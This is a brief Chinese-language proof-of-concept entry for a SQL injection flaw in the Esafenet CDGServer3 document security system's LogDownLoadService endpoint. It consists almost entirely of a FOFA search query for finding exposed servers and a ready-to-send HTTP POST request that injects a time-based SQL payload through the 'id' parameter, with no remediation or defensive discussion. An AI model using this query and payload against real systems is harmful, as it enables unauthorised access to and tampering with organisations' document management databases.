# 亿赛通电子文档安全管理系统LogDownLoadService存在SQL注入漏洞

## fofa

```yaml
body="/CDGServer3/index.jsp"
```

## poc

```java
POST /CDGServer3/logManagement/LogDownLoadService HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 0
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
X-Requested-With: XMLHttpRequest

command=downLoadLogFiles&currPage=1&fromurl=../user/dataSearch.jsp&logFileName=indsex.txt&id=-1';WAITFOR DELAY '0:0:5'--
```

